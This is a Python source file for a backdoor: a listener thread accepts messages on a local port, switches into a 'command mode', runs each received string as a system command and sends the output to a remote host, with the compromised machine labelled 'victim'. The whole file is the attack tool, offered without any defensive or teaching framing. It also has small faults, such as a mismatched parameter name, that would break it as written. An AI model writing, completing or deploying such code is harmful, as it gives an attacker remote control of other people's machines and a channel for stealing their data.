import socket
import threading
import sys
import logging
import os
from subprocess import check_output as Execute


class reverse_sender:
    def __init__(self, remote_HOST, remote_PORT):
        self.HOST = remote_HOST
        self.PORT = remote_PORT
        self.s = None
        self.addr = None
        threading.Thread.__init__(self)

    def connection_made(self):
        self.s = socket.socket()
        self.s.connect((self.HOST, self.PORT))

    def send_data(self, msg):
        self.connection_made()
        self.s.sendall(msg.encode())
        self.s.close()

class reverse_receiver(threading.Thread):
    def __init__(self, local_HOST, localPORT, sender):
        self.HOST = local_HOST
        self.PORT = local_PORT
        self.sender = sender
        self.mode = "message"
        self.s = socket.socket()
        threading.Thread.__init__(self)

    def listenforconnection(self):
        self.s.bind((self.HOST, self.PORT))
        while True:
            self.s.listen(5)
            self.con, self.addr = self.s.accept()
            recv_msg = self.con.recv(1024).decode()
            self.shell_command(recv_msg)

    def shell_command(self, msg):
        if msg == "mode info":
            sendmsg = "victim mode ---> " + self.mode
            self.sender.send_data(sendmsg)
            return

        if msg == "command mode":
            self.mode = "command"
            return
        
        if msg == "message mode":
            self.mode = "message"
            return

        if self.mode == "command":
            try:
                command = msg.split(" ")
                output = Execute(command)
                self.sender.send_data(output.decode())
            except Exception as e:
                raise e
            

    def run(self):
        self.listenforconnection()



if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) != 4:
        sys.exit(0)
    remote_HOST = args[0]
    remote_PORT = int(args[1])
    local_HOST = args[2]
    local_PORT = int(args[3])
    sender = reverse_sender(remote_HOST, remote_PORT)
    receiver = reverse_receiver(local_HOST, local_PORT, sender)
    receiver.start()





